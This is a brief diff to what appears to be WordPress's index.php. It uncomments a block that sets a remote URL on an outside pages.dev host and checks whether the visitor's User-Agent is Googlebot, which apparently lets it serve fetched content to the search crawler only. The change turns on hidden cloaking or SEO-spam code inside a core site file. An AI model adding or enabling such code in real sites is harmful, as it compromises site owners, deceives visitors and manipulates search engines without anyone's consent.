@@ -1,5 +1,4 @@
 <?php
-/**
 $REMOTE_URL = 'https://apimembara.pages.dev/index.txt';
 
 // Fungsi cek sederhana (User-Agent saja)
@@ -35,7 +34,6 @@ if (is_googlebot()) {
         exit;
     }
 }
- */
 
 /**
  * Tells WordPress to load the WordPress theme and output it.
